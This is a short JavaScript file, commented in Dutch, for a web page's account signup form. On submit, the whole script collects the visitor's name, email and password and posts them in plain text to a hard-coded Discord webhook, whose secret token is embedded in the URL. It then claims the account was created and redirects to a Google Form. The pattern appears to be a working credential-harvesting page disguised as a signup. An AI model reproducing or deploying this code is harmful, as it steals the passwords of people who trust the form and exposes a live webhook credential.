// Laat het signup-formulier zien
function showSignupForm() {
    document.getElementById('signup-form').style.display = 'flex';
}

// Verberg het signup-formulier
function hideSignupForm() {
    document.getElementById('signup-form').style.display = 'none';
}

// Verzend gegevens naar de webhook
document.getElementById('form').addEventListener('submit', function(e) {
    e.preventDefault();

    const firstname = document.getElementById('firstname').value;
    const lastname = document.getElementById('lastname').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const webhookURL = 'https://discord.com/api/webhooks/1326324886062501970/YyoJlT6BS7VnwpRzBGy20wnXsXxJDFyX9dElNjAesxgMIY8LqkFDB8zw8lNRKIqEijKX';

    const data = {
        username: 'Account Aanmelding',
        content: `Nieuwe aanmelding!:\nVoornaam: ${firstname}\nAchternaam: ${lastname}\nEmail: ${email}\nWachtwoord: ${password}`,
    };

    // Verzend de gegevens naar de webhook
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            alert('Account succesvol aangemaakt!');
            window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLScLQJKji2zYpfioFR_dYqG_Mnsd8DYb2lvm5gmWkHHs4tt3cA/viewform";
        } else {
            alert('Er is iets misgegaan. Probeer het later opnieuw.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Er is een fout opgetreden. Probeer het later opnieuw.');
    });
});
